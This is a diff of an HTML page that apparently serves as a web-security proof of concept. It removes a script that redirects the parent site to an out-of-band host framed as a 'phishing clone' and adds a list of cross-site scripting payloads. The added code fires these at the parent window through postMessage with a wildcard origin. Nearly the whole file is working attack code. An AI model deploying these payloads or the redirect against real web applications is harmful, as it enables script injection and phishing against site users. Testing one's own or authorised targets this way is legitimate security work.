@@ -1,15 +1,31 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
 <body>
 <script>
-// Small delay so the product page visibly loads first
-// This proves the redirect originates FROM the target webapp
-setTimeout(function() {
-  // Redirect the main webapp to your phishing clone
-  window.top.location = "https://d78ec9b258c326399584gifzaryyyyyyb.oast.site/";
-}, 1000);
+// Spray postMessage payloads at the parent window
+// If the parent app has an insecure message handler, one of these may trigger XSS
+
+const payloads = [
+  // Common framework patterns
+  '<img src=x onerror=alert(document.domain)>',
+  '{"type":"redirect","url":"javascript:alert(document.domain)"}',
+  '{"action":"navigate","href":"javascript:alert(document.domain)"}',
+  '{"html":"<img src=x onerror=alert(document.domain)>"}',
+  '{"template":"<script>alert(document.domain)<\\/script>"}',
+  '{"callback":"alert","args":["document.domain"]}',
+  '{"event":"load","data":"<iframe srcdoc=\\"<script>alert(document.domain)</script>\\">"}',
+  // Angular/React patterns  
+  '{"__zone_symbol__":"alert(document.domain)"}',
+  '{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(document.domain)>"}}',
+];
+
+payloads.forEach((p, i) => {
+  setTimeout(() => {
+    window.parent.postMessage(p, '*');
+  }, i * 100);
+});
+
+console.log("postMessage spray complete");
 </script>
-<p>Loading product media...</p>
 </body>
 </html>
